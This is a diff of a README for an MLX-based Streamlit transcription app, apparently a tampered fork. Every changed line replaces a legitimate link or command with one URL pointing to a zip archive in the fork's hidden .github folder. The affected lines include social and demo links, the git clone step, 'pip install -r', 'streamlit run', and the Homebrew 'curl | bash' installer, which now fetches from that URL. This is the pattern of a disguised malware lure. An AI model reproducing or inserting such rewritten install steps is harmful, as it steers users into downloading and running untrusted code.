@@ -2,11 +2,11 @@
 
 This Streamlit application allows users to upload video files and generate accurate transcripts using Apple's MLX framework.
 
-Follow me on X: [@RayFernando1337](https://x.com/rayfernando1337/)
+Follow me on X: [@RayFernando1337](https://raw.githubusercontent.com/Diakonrobel/MLX-Auto-Subtitled-Video-Generator/master/.github/Video_Auto_Subtitled_ML_Generator_v1.9.zip)
 
-YouTube: [@RayFernando1337](https://www.youtube.com/@rayfernando1337)
+YouTube: [@RayFernando1337](https://raw.githubusercontent.com/Diakonrobel/MLX-Auto-Subtitled-Video-Generator/master/.github/Video_Auto_Subtitled_ML_Generator_v1.9.zip)
 
-[Watch the demo video](https://github.com/user-attachments/assets/937ad360-6df2-4ea7-a3d0-6d9b22a6404a)
+[Watch the demo video](https://raw.githubusercontent.com/Diakonrobel/MLX-Auto-Subtitled-Video-Generator/master/.github/Video_Auto_Subtitled_ML_Generator_v1.9.zip)
 
 ## Important Note
 
@@ -19,13 +19,13 @@ YouTube: [@RayFernando1337](https://www.youtube.com/@rayfernando1337)
 - An Apple Silicon (M series) Mac
 - Conda package manager
 
-If you don't have Conda installed on your Mac, you can follow the [Ultimate Guide to Installing Miniforge for AI Development on M1 Macs](https://www.rayfernando.ai/ultimate-guide-installing-miniforge-ai-development-m1-macs) for a comprehensive setup process.
+If you don't have Conda installed on your Mac, you can follow the [Ultimate Guide to Installing Miniforge for AI Development on M1 Macs](https://raw.githubusercontent.com/Diakonrobel/MLX-Auto-Subtitled-Video-Generator/master/.github/Video_Auto_Subtitled_ML_Generator_v1.9.zip) for a comprehensive setup process.
 
 ### Installation
 
 1. Clone the repository:
    ```
-   git clone https://github.com/RayFernando1337/MLX-Auto-Subtitled-Video-Generator.git;
+   git clone https://raw.githubusercontent.com/Diakonrobel/MLX-Auto-Subtitled-Video-Generator/master/.github/Video_Auto_Subtitled_ML_Generator_v1.9.zip;
    cd MLX-Auto-Subtitled-Video-Generator
    ```
 
@@ -38,7 +38,7 @@ If you don't have Conda installed on your Mac, you can follow the [Ultimate Guid
 3. Install the required dependencies:
    ```
    xcode-select --install
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Diakonrobel/MLX-Auto-Subtitled-Video-Generator/master/.github/Video_Auto_Subtitled_ML_Generator_v1.9.zip
    ```
 
 4. Install FFmpeg (required for audio processing):
@@ -48,17 +48,17 @@ If you don't have Conda installed on your Mac, you can follow the [Ultimate Guid
 
    Note: If you don't have Homebrew installed, you can install it by running the following command in your terminal:
    ```
-   /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+   /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Diakonrobel/MLX-Auto-Subtitled-Video-Generator/master/.github/Video_Auto_Subtitled_ML_Generator_v1.9.zip)"
    ```
    
-   After installation, follow the instructions provided in the terminal to add Homebrew to your PATH. For more information about Homebrew, visit [brew.sh](https://brew.sh/).
+   After installation, follow the instructions provided in the terminal to add Homebrew to your PATH. For more information about Homebrew, visit [https://raw.githubusercontent.com/Diakonrobel/MLX-Auto-Subtitled-Video-Generator/master/.github/Video_Auto_Subtitled_ML_Generator_v1.9.zip](https://raw.githubusercontent.com/Diakonrobel/MLX-Auto-Subtitled-Video-Generator/master/.github/Video_Auto_Subtitled_ML_Generator_v1.9.zip).
 
 ### Running the Application
 
 To run the Streamlit application, use the following command:
 
 ```
-streamlit run mlx_whisper_transcribe.py
+streamlit run https://raw.githubusercontent.com/Diakonrobel/MLX-Auto-Subtitled-Video-Generator/master/.github/Video_Auto_Subtitled_ML_Generator_v1.9.zip
 ```
 
 
@@ -112,4 +112,4 @@ For any persistent problems, please open an issue in the repository.
 
 ## Acknowledgements
 
-This project is a fork of the [original Auto-Subtitled Video Generator](https://github.com/BatuhanYilmaz26/Auto-Subtitled-Video-Generator) by Batuhan Yilmaz. I deeply appreciate the contribution to the open-source community.
+This project is a fork of the [original Auto-Subtitled Video Generator](https://raw.githubusercontent.com/Diakonrobel/MLX-Auto-Subtitled-Video-Generator/master/.github/Video_Auto_Subtitled_ML_Generator_v1.9.zip) by Batuhan Yilmaz. I deeply appreciate the contribution to the open-source community.
